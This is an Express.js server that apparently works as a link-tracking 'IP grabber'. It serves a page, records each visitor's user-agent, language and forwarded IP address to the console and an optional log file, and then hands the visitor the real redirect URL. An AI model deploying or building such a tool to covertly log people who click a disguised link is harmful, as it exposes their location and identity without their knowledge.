const express = require('express');
const path = require('path');
const process = require('process');
const fs = require('fs');

const args = process.argv;

const app = express();

function SearchFlagValue(flag){
    const flag_index = args.indexOf(flag);
    if(flag_index == -1){
        return undefined;
    }else{
        return args[flag_index + 1];
    }
}

const url = SearchFlagValue('-u');
if(url == undefined){
    throw new Error('You need to specify the redirect url using the -u flag. \n For example: -u https://www.google.com .');
    process.exit();
}



let LogFileName;

if(args.indexOf('-l') == -1){
    console.log('\x1b[33m%s\x1b[0m', 'You can specify to create or write a log file using the -l flag.');
}else{
    LogFileName = `log${Date.now()}.txt`;
    fs.writeFile( LogFileName,'', () => console.log('Created Log File: ' + LogFileName));
}

app.get('', (req, res) => {
    res.sendFile(__dirname + '/index.html')
});
app.post('/get', (req, res) => {
    console.log("\x1b[32m", req.headers);
    if(args.indexOf('-l') !== -1){
        let data = '' + "user-agent: " + req.headers["user-agent"] + '\n' + "lang: " + req.headers["accept-language"] + '\n' + 'IP: ' + req.headers["x-forwarded-for"] + '\n';
        fs.appendFile(LogFileName, data , () => {})
    }
    res.send({status: true});
});
app.get('/geturl', (req, res) => {
    res.send({url});
});
app.listen(9999, () => console.log("\x1b[32m",  'Started!'));